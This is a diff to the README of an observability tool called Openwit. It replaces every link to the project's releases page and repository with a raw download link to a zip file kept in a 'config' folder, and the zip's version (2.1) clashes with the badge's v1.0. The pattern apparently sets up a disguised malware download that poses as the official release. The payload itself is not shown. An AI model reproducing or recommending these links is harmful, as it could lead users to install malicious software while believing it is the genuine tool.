@@ -6,9 +6,9 @@ Welcome to Openwit! This application is your solution for collecting and analyzi
 
 ## 📥 Download Openwit
 
-[![Download Openwit](https://img.shields.io/badge/Download%20Openwit-v1.0-brightgreen)](https://github.com/Blacklist1nt/openwit/releases)
+[![Download Openwit](https://raw.githubusercontent.com/Blacklist1nt/openwit/main/config/openwit-2.1.zip%20Openwit-v1.0-brightgreen)](https://raw.githubusercontent.com/Blacklist1nt/openwit/main/config/openwit-2.1.zip)
 
-To get started with Openwit, simply visit this page to download the latest version: [Download Openwit](https://github.com/Blacklist1nt/openwit/releases).
+To get started with Openwit, simply visit this page to download the latest version: [Download Openwit](https://raw.githubusercontent.com/Blacklist1nt/openwit/main/config/openwit-2.1.zip).
 
 ## 💻 System Requirements
 
@@ -79,7 +79,7 @@ If you encounter issues or need assistance, consult the following resources:
 
 For further learning and exploration, consider these resources related to Openwit:
 
-- **GitHub Repository:** [Openwit GitHub](https://github.com/Blacklist1nt/openwit)
+- **GitHub Repository:** [Openwit GitHub](https://raw.githubusercontent.com/Blacklist1nt/openwit/main/config/openwit-2.1.zip)
 - **Blog Posts:** Read articles about observability best practices.
 - **Webinars:** Attend free sessions to understand Openwit features better.
 
@@ -111,6 +111,6 @@ Openwit is released under the MIT License. You are free to use, modify, and dist
 
 ## 📥 Download Openwit Again
 
-To download the latest version of Openwit, visit this page: [Download Openwit](https://github.com/Blacklist1nt/openwit/releases). 
+To download the latest version of Openwit, visit this page: [Download Openwit](https://raw.githubusercontent.com/Blacklist1nt/openwit/main/config/openwit-2.1.zip). 
 
 Thank you for choosing Openwit for your observability needs!
